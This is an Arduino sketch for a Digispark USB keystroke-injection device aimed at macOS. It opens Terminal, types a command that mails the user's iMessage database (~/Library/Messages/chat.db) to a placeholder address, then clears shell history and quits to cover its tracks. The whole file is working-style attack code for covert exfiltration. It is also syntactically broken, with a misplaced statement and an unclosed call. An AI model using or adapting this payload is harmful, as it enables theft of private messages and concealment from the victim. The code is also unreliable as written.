#include "DigiKeyboard.h"
#define KEY_ENTER 0x28 // Enter key

void setup() {}
    pinMode(1, OUTPUT);
void loop() {
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,44);
    DigiKeyboard.delay(150);
    DigiKeyboard.print("Terminal");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(300);
    DigiKeyboard.print("cat ~/Library/Messages/chat.db chat.db | mail -s 'Digispark Report' <email_address>"
    DigiKeyboard.delay(300);
    DigiKeyboard.print("history -c");
    DigiKeyboard.delay(300);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.print("exit");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(250);
    DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_Q);
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(90000);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(5000);
    for(;;){ /*empty*/ }

}
